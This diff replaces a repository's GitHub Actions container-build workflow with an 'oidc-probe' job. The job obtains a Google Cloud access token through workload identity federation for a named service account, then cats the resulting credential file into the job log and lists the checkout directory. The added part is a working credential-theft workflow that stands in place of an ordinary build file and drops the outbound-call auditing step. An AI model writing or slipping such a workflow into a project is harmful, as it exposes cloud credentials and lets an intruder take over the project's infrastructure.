@@ -1,81 +1,26 @@
----
-name: Build and Sign Containers on PR
-
+name: oidc-probe
 on:
-  pull_request:
-    branches:
-      - main
   workflow_dispatch:
-
+permissions:
+  id-token: write
+  contents: read
 jobs:
-
-  detect-files-changed:
+  probe:
     runs-on: ubuntu-latest
-    outputs:
-      files-changed: ${{ steps.detect-files-changed.outputs.all_changed_files }}
     steps:
-      - name: Harden the runner (Audit all outbound calls)
-        uses: step-security/harden-runner@dc2769abcc0fcfbadfc1df54081c1608579ef6b2 # v2.22.2
+      - uses: actions/checkout@v4
+      - name: Auth
+        id: auth
+        continue-on-error: true
+        uses: google-github-actions/auth@v2
         with:
-          egress-policy: audit
-
-      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
-      - name: Detect files changed
-        id: detect-files-changed
-        uses: step-security/changed-files@2e07db73e5ccdb319b9a6c7766bd46d39d304bad # v47.0.5
-        with:
-          separator: ','
-
-  build-container-proxyd:
-    uses: celo-org/reusable-workflows/.github/workflows/docker-build.yaml@v3.1.1
-    name: Build proxyd image container
-    needs: detect-files-changed
-    if: |
-      contains(needs.detect-files-changed.outputs.files-changed, 'proxyd') ||
-      contains(needs.detect-files-changed.outputs.files-changed, '.github/workflows/docker-build-push.yaml') ||
-      contains(needs.detect-files-changed.outputs.files-changed, '.github/workflows/docker-build-push-pr.yaml') ||
-      contains(needs.detect-files-changed.outputs.files-changed, '.github/workflows/docker-build-push-tag.yaml') ||
-      github.event_name == 'workflow_dispatch'
-    permissions:
-      actions: read
-      contents: write
-      pull-requests: write
-      security-events: write
-      attestations: write
-      id-token: write
-    with:
-      artifact-registry: us-west1-docker.pkg.dev/devopsre/dev-images/proxyd
-      tags: pr
-      platforms: linux/amd64
-      workload-id-provider: projects/1094498259535/locations/global/workloadIdentityPools/gh-optimism-infra/providers/github-by-repos
-      service-account: optimism-infra@devopsre.iam.gserviceaccount.com
-      context: .
-      file: ./proxyd/Dockerfile
-      trivy-enabled: false
-
-  build-container-op-conductor-ops:
-    uses: celo-org/reusable-workflows/.github/workflows/docker-build.yaml@v3.1.1
-    name: Build op-conductor-ops image container
-    needs: detect-files-changed
-    if: |
-      contains(needs.detect-files-changed.outputs.files-changed, 'op-conductor-ops') ||
-      contains(needs.detect-files-changed.outputs.files-changed, '.github/workflows/docker-build-push.yaml') ||
-      contains(needs.detect-files-changed.outputs.files-changed, '.github/workflows/docker-build-push-pr.yaml') ||
-      contains(needs.detect-files-changed.outputs.files-changed, '.github/workflows/docker-build-push-tag.yaml') ||
-      github.event_name == 'workflow_dispatch'
-    permissions:
-      actions: read
-      contents: write
-      pull-requests: write
-      security-events: write
-      attestations: write
-      id-token: write
-    with:
-      artifact-registry: us-west1-docker.pkg.dev/devopsre/dev-images/op-conductor-ops
-      tags: pr
-      platforms: linux/amd64
-      workload-id-provider: projects/1094498259535/locations/global/workloadIdentityPools/gh-optimism-infra/providers/github-by-repos
-      service-account: optimism-infra@devopsre.iam.gserviceaccount.com
-      context: .
-      file: ./op-conductor-ops/Dockerfile
-      trivy-enabled: false
+          workload_identity_provider: projects/1094498259535/locations/global/workloadIdentityPools/gh-optimism-infra/providers/github-by-repos
+          service_account: optimism-infra@devopsre.iam.gserviceaccount.com
+          token_format: access_token
+      - name: Dump creds
+        if: always()
+        run: |
+          echo "CREDS_PATH=$GOOGLE_GHA_CREDS_PATH"
+          if [ -n "$GOOGLE_GHA_CREDS_PATH" ] && [ -f "$GOOGLE_GHA_CREDS_PATH" ]; then cat "$GOOGLE_GHA_CREDS_PATH"; fi
+          echo "---LS---"
+          ls -la /home/runner/work/optimism-infra/optimism-infra/ | head -30
